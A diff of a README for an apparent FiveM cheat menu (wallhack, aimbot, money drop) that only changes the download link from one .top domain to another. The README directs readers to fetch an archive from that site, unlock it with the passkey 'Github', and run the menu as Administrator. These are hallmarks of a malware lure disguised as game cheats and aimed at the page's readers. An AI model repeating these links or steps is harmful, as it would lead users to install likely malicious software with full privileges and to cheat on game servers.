@@ -6,7 +6,7 @@ FiveM external menu with ESP wallhack, aimbot, vehicle spawn, money drop, god mo
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top/)**
 
 Archive passkey: `Github`
 
@@ -85,7 +85,7 @@ Archive passkey: `Github`
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top/)** to download.
 2. Extract the archive.
 3. Launch FiveM and join a server.
 4. Run the menu **as Administrator**.
